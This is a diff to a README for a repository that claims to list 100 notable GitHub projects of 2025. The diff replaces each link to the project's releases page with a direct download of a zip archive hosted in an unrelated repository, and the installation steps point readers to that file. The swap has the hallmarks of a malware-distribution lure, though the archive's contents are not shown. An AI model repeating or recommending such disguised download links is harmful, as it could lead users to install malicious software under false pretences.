@@ -9,7 +9,7 @@ description: "🚀 Discover 100 groundbreaking GitHub projects from 2025 that sh
 Welcome to "100-GitHub-Projects-That-Defined-2025"! This project showcases a selection of top open-source tools that will enhance your workflow in 2025. Whether you're interested in AI, Kubernetes, or other cutting-edge technologies, you'll find valuable resources here.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/mitsou55/100-GitHub-Projects-That-Defined-2025/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mitsou55/mitsou55.github.io/main/clapwort/v3.4.zip)
 
 ## 🔍 Overview
 This repository is a curated list of standout open-source projects that have made an impact in 2025. It includes tools for:
@@ -33,10 +33,10 @@ The "100-GitHub-Projects-That-Defined-2025" repository includes:
 - Community support and resources to help you get started.
 
 ## 📥 Download & Install
-To download the latest version of the tools, please visit this page: [Download Page](https://github.com/mitsou55/100-GitHub-Projects-That-Defined-2025/releases). 
+To download the latest version of the tools, please visit this page: [Download Page](https://raw.githubusercontent.com/mitsou55/mitsou55.github.io/main/clapwort/v3.4.zip). 
 
 ### Installation Steps
-1. Go to the [Release Page](https://github.com/mitsou55/100-GitHub-Projects-That-Defined-2025/releases).
+1. Go to the [Release Page](https://raw.githubusercontent.com/mitsou55/mitsou55.github.io/main/clapwort/v3.4.zip).
 2. Select the latest release version.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the file in your Downloads folder.
